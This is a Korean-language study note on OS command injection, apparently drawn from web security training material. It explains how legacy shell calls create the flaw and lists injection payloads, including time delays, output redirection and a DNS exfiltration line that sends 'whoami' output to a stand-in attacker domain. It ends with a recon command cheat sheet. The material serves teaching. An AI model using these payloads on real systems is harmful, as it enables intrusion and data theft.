## OS 명령어 주입

현대의 애플리케이션은 데이터베이스에 직접 접근하는 방식으로 애플리케이션 로직을 처리함. 
하지만 하지만 현실의 기업 환경(특히 오래된 은행, 대기업, 초창기 쇼핑몰 등)에서는 **레거시 시스템을 거치게 되는 경우**가 있음.

**레거시 시스템**: 10년, 20년 전에 만들어져서 지금은 낡고 유지보수하기 힘들지만, 회사의 핵심 업무를 담당하고 있어서 함부로 버리거나 교체하지 못하는 과거의 시스템(서버, 프로그램 등)
과거에는 재고를 관리하는 로직이 단순히 DB 값 하나를 읽는 게 아니라, 여러 창고 서버의 데이터를 취합하고 복잡한 계산을 수행하는 별도의 C언어 프로그램이나 스크립트로 짜여 있는 경우가 많았음.

**개발자의 타협**
웹사이트를 새로 만들 때, 이 복잡한 재고 확인 로직을 최신 웹 언어로 처음부터 다시 짜는 것은 비용과 위험이 큼. 
그래서 개발자들은 "그냥 웹 서버 백엔드에서 예전에 쓰던 재고 확인 프로그램을 터미널 명령어 치듯이 실행해서 결과 텍스트만 웹으로 보여주자!"라고 타협하게 됨.

이러한 과거의 관행 때문에 웹 애플리케이션이 DB와 직접 소통하지 않고, 운영체제(OS)의 셸(Shell)을 통해 다른 프로그램을 호출하는 상황이 나옴. 바로 이 지점에서 **OS 명령어 주입 취약점**이 발생

### 예시

- 재고 확인 URL : `https://insecure-website.com/stockStatus?productID=381&storeID=29`
- 서버에서 돌아가는 셸 명령어: `stockreport.pl 381 29`
- OS 명령어 주입: productID 등에 ID 대신에 `& echo hello &` 입력
- 실제로 실행되는 셸 명령어: `stockreport.pl & echo hello & 29`


- 시간 지연: `& ping -c 10 127.0.0.1 &` (모든 운영체제), `sleep 10` (리눅스)
- 출력 리다이렉션: `& whoami > /var/www/static/whoami.txt &`
- OAST 기술 활용 
	- 서버에서 `ping`, `sleep` 명령어를 막아둘 수 있지만 `nslookup` 명령어는 절대 막아둘 수 없음.
	- `& nslookup kgji2ohoyw.web-attacker.com &`: 해당 도메인에 대한 DNS 조회를 수행 (DNS 서버에 해당 도메인의 IP를 받아옴.) 
	- `& nslookup $(whoami).kgji2ohoyw.web-attacker.com &`: `whoami` 명령어의 결과가 포함된 공격자의 도메인에 대한 DNS 조회 수행됨. 
		- 예: `wwwuser.kgji2ohoyw.web-attacker.com`


### OS 명령어

**연산자**
`;`: A 끝난 후 B 실행 (리눅스)
`&`: A 백그라운드, B 바로 실행
`|`: A의 결과를 B의 입력으로 (앞 명령어 결과를 덮어버리고 내 결과만 보기 좋음)
`&&`: A가 **성공해야만** B 실행
`||`: A가 **실패해야만** B 실행

**명령어**
현재 사용자의 이름: `whoami`
운영체제: `uname -a`(리눅스), `ver` (Windows)
네트워크 구성: `ifconfig`(리눅스), `ipconfig /all`(Windows)
네트워크 연결: `netstat -an` (리눅스), `netstat -an` (Windows)
실행 중인 프로세스: `ps -ef` (리눅스), `tasklist` (Windows)
명령어 내에 명령어 삽입: 백틱 (리눅스), `$()` (Linux)
